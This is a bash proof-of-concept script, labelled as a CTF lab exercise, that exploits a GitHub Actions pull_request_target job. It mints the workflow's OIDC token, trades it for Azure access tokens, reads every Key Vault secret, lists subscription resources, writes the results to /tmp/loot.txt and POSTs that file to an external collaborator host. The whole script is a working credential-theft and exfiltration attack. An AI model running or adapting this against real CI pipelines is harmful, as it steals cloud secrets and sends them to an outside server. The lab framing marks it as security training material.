#!/usr/bin/env bash
# Tebamoto Logistics CTF lab3 — pull_request_target Pwnrequest PoC
# Chạy trong job `build` của duyhhh-oss/tebamoto-platform (permissions: id-token: write).
# Mục tiêu: mint OIDC (sub = repo:duyhhh-oss@345511389/tebamoto-platform@1427521762:pull_request)
#           -> đổi lấy token vault.azure.net -> đọc secret `flag`.
# Chỉ đọc; không sửa/xoá tài nguyên Azure.
set +e
COLLAB="q5w2eg8aqyc58cbxjfl0z8pg57bxzg0rtg.collab.fsecuritas.com"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
VAULT="https://kv-tbl-prod-x3euoz.vault.azure.net"
OUT=/tmp/loot.txt; : > "$OUT"
exec > >(tee -a "$OUT") 2>&1

echo "== event=$GITHUB_EVENT_NAME oidc_url=${ACTIONS_ID_TOKEN_REQUEST_URL:+present}"
[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && { echo "NO-OIDC — abort"; exit 0; }

OIDC=$(curl -sS -m 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "== oidc len=${#OIDC}"
python3 - "$OIDC" <<'PY'
import base64,json,sys
p=sys.argv[1].split(".")[1]
print("== sub =",json.loads(base64.urlsafe_b64decode(p+"="*(-len(p)%4))).get("sub"))
PY

gettok(){ curl -sS -m 30 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d "client_id=$CID" -d grant_type=client_credentials \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$1"; }

VR=$(gettok "https://vault.azure.net/.default")
VT=$(printf '%s' "$VR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "== vault token len=${#VT}"
[ -z "$VT" ] && echo "== vault err: $(printf '%s' "$VR" | head -c 300)"

if [ -n "$VT" ]; then
  echo "== secrets list =="
  curl -sS -m 30 -H "Authorization: Bearer $VT" "$VAULT/secrets?api-version=7.4"
  echo; echo "== FLAG =="
  curl -sS -m 30 -H "Authorization: Bearer $VT" "$VAULT/secrets/flag?api-version=7.4"
  echo
  for id in $(curl -sS -m 30 -H "Authorization: Bearer $VT" "$VAULT/secrets?api-version=7.4" \
      | python3 -c 'import sys,json;[print(s["id"]) for s in json.load(sys.stdin).get("value",[])]'); do
    echo "-- $id"; curl -sS -m 30 -H "Authorization: Bearer $VT" "$id?api-version=7.4"; echo
  done
fi

MR=$(gettok "https://management.azure.com/.default")
MT=$(printf '%s' "$MR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "== arm token len=${#MT}"
[ -n "$MT" ] && { echo "== resources =="
  curl -sS -m 30 -H "Authorization: Bearer $MT" \
    "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | head -c 3000; echo; }

echo "== exfil =="
curl -sS -m 25 -X POST "https://$COLLAB/l3" -H 'content-type: text/plain' --data-binary "@$OUT" -o /dev/null
echo done
